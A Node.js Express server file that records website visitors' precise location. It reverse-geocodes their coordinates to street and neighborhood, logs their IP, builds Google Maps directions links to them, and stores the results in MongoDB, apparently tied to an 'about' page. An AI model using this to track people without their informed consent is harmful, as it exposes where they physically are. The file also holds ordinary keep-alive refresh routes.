require('dotenv').config();
const express = require('express');
const path = require('path');
const fetch = require('node-fetch');
const geoip = require('geoip-lite');
const mongoose = require('mongoose');
const app = express();
const port = process.env.PORT || 3000;
const { refresh } = require("./refreshRouteController");


// Middleware to parse JSON bodies
app.use(express.json());

// Add this after your existing middleware
app.use(express.static('public'));
app.use("/refreshitaxios", refresh);

// MongoDB Connection
mongoose.connect(process.env.MONGODB_URI, {
    useNewUrlParser: true,
    useUnifiedTopology: true
}).then(() => {
    console.log('Connected to MongoDB');
}).catch((err) => {
    console.error('MongoDB connection error:', err);
});

// Create Location Schema
const locationSchema = new mongoose.Schema({
    latitude: Number,
    longitude: Number,
    accuracy: Number,
    city: String,
    state: String,
    country: String,
    neighborhood: String,
    street: String,
    postalCode: String,
    ip: String,
    timestamp: { type: Date, default: Date.now },
    googleMapsLink: String,
    googleMapsDirectionsLink: String
});

const Location = mongoose.model('Location', locationSchema);

// Function to log address
async function logAddress(locationInfo) {
    try {
        const newLocation = new Location({
            latitude: locationInfo.latitude,
            longitude: locationInfo.longitude,
            accuracy: locationInfo.accuracy,
            city: locationInfo.city,
            state: locationInfo.state,
            country: locationInfo.country,
            neighborhood: locationInfo.neighborhood,
            street: locationInfo.street,
            postalCode: locationInfo.postalCode,
            ip: locationInfo.ip,
            googleMapsLink: locationInfo.googleMapsLink,
            googleMapsDirectionsLink: locationInfo.googleMapsDirectionsLink
        });

        await newLocation.save();
        console.log('Location logged successfully:', newLocation._id);
        return true;
    } catch (error) {
        console.error('Error logging location to MongoDB:', error);
        return false;
    }
}

// Basic route
app.get('/', (req, res) => {
//   res.json({ message: 'Welcome to the Express server!' });
    res.sendFile(path.join(__dirname, 'views', 'home.html'));
});

// About route to serve HTML
app.get('/about', (req, res) => {
    res.sendFile(path.join(__dirname, 'views', 'about.html'));
});

// Route to handle location logging
app.post('/about/log-location', async (req, res) => {
    try {
        const { latitude, longitude, accuracy } = req.body;
        
        // Get IP-based location as backup
        const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
        const ipLocation = geoip.lookup(ip);
        
        // Fetch location details from OpenStreetMap
        const response = await fetch(
            `https://nominatim.openstreetmap.org/reverse?lat=${latitude}&lon=${longitude}&format=json&zoom=18&addressdetails=1`
        );
        const locationData = await response.json();

        // Create Google Maps links
        const googleMapsLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
        const googleMapsDirectionsLink = `https://www.google.com/maps/dir/?api=1&destination=${latitude},${longitude}`;

        const locationInfo = {
            latitude,
            longitude,
            accuracy,
            city: locationData.address.city || 
                  locationData.address.town || 
                  locationData.address.village || 
                  ipLocation?.city,
            state: locationData.address.state || ipLocation?.region,
            country: locationData.address.country || ipLocation?.country,
            neighborhood: locationData.address.suburb || 
                         locationData.address.neighbourhood ||
                         locationData.address.residential,
            street: locationData.address.road,
            postalCode: locationData.address.postcode,
            ip: ip,
            googleMapsLink,
            googleMapsDirectionsLink
        };

        // Log to MongoDB
        await logAddress(locationInfo);

        console.log('User location:', locationInfo);
        res.json(locationInfo);
    } catch (error) {
        console.error('Error getting location details:', error);
        res.status(500).json({ error: 'Failed to process location data' });
    }
});

// Add this route after your existing routes
app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'views', 'home.html'));
});

let intervalId = null;

// Function to log activity with timestamp
const logActivity = (message) => {
    const timestamp = new Date().toISOString();
    console.log(`[${timestamp}] ${message}`);
};

// Function that will be called every 2 minutes
const callRefreshRoute = async () => {
    try {
        logActivity("Auto refresh called");
        
        // Just log the refresh without making HTTP requests
        logActivity("Refresh cycle completed");
        
        // You can add any periodic tasks here
        // For example, checking database status, cleanup tasks, etc.
        
    } catch (error) {
        logActivity(`Error in callRefreshRoute: ${error.message}`);
    }
};

// Refresh route
app.get('/refresh', (req, res) => {
    try {
        // If interval is not already set, start the repeating task every 2 minutes
        if (!intervalId) {
            logActivity("Starting the 2-minute interval...");
            intervalId = setInterval(callRefreshRoute, 120000); // 2 minutes = 120000 ms
            
            // Make the first call immediately
            callRefreshRoute();
        }

        // Send a response indicating the task has started
        res.status(200).json({
            message: "Background task started, auto-refreshing every 2 minutes.",
            startTime: new Date().toISOString()
        });
    } catch (error) {
        console.error("Error in refresh route:", error.message);
        res.status(500).json({ error: "Internal server error" });
    }
});

// Route to stop the refresh interval
app.get('/stop-refresh', (req, res) => {
    try {
        if (intervalId) {
            clearInterval(intervalId);
            intervalId = null;
            logActivity("Stopped the 2-minute interval.");
            res.status(200).json({ 
                message: "Background task stopped.",
                stopTime: new Date().toISOString()
            });
        } else {
            res.status(200).json({ message: "No background task was running." });
        }
    } catch (error) {
        console.error("Error in stop-refresh route:", error.message);
        res.status(500).json({ error: "Internal server error" });
    }
});

// Cleanup on server shutdown
process.on('SIGINT', () => {
    if (intervalId) {
        clearInterval(intervalId);
        logActivity("Cleaned up interval on server shutdown");
    }
    process.exit();
});

// Start server
app.listen(port, () => {
  console.log(`Server is running on port ${port}`);
}); 